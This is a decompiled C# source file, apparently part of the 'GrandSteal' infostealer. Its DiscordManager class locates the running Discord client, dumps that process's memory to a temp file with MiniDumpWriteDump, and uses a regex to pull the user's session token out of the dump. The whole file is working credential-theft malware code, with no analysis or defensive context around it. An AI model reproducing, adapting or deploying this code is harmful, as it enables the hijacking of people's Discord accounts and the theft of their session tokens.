using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using GrandSteal.Client.Models;
using GrandSteal.Client.Models.Extensions.Json;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001E RID: 30
	public static class DiscordManager
	{
		// Token: 0x060000D6 RID: 214
		[DllImport("DbgHelp.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

		// Token: 0x060000D7 RID: 215 RVA: 0x00006868 File Offset: 0x00004A68
		public static DiscordSession Extract()
		{
			try
			{
				Process process = DiscordManager.FindDisordProcess();
				if (process != null)
				{
					string text = DiscordManager.DumpProcess(process);
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = DiscordManager.FindDiscordJsonSession(text);
						if (!string.IsNullOrEmpty(text2))
						{
							return text2.FromJSON<DiscordSession>();
						}
						Console.WriteLine("JsonSession UNKNOWN");
					}
					else
					{
						Console.WriteLine("Discord dump UNKNOWN");
					}
				}
				else
				{
					Console.WriteLine("Discord process UNKNOWN");
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x000068E4 File Offset: 0x00004AE4
		private static string FindDiscordJsonSession(string data)
		{
			try
			{
				using (IEnumerator enumerator = DiscordManager.regex.Matches(data).GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((Match)enumerator.Current).Value;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return string.Empty;
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00006960 File Offset: 0x00004B60
		private static string DumpProcess(Process process)
		{
			string empty = string.Empty;
			try
			{
				string path = Environment.ExpandEnvironmentVariables(Path.Combine("%temp%", "discord.dmp"));
				bool flag = false;
				using (FileStream fileStream = File.Open(path, FileMode.Create, FileAccess.Write))
				{
					flag = DiscordManager.MiniDumpWriteDump(process.Handle, process.Id, fileStream.SafeFileHandle.DangerousGetHandle(), 2u, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				}
				if (flag)
				{
					return File.ReadAllText(path);
				}
			}
			catch
			{
			}
			return empty;
		}

		// Token: 0x060000DA RID: 218 RVA: 0x00006A00 File Offset: 0x00004C00
		private static Process FindDisordProcess()
		{
			try
			{
				foreach (Process process in Process.GetProcessesByName("Discord"))
				{
					if (ClientInfoHelper.GetCommandLine(process).Trim() == "\"" + process.MainModule.FileName + "\"")
					{
						return process;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}

		// Token: 0x04000062 RID: 98
		private static Regex regex = new Regex("({\"token\":\"(.*)}}]})", RegexOptions.Compiled);
	}
}
